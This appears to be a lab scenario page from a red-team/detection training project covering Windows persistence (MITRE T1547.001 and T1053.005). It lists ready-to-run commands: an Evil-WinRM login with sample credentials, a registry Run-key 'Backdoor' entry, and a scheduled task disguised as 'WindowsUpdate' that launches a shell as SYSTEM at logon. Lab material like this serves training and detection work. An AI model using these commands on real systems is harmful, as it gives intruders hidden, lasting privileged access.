# Scenario 14 — Persistence

![MITRE](https://img.shields.io/badge/MITRE-T1547.001%20%7C%20T1053.005-red)
![Status](https://img.shields.io/badge/Status-Planned-yellow)
![Tool](https://img.shields.io/badge/Tool-Evil--WinRM-orange)

## MITRE ATT&CK
- T1547.001 — Registry Run Keys
- T1053.005 — Scheduled Task

## Tools
- CrackMapExec
- Evil-WinRM

## 6.1 Registry Backdoor

```bash
evil-winrm -i 10.10.20.10 -u john.doe -p Password123
```

```powershell
# Dans la session Evil-WinRM
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\shell.exe"
```

## 6.2 Scheduled Task

```powershell
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\shell.exe" /sc onlogon /ru System
```

## Detection
See: 05-detection/wazuh-rules/06-persistence-detection.md
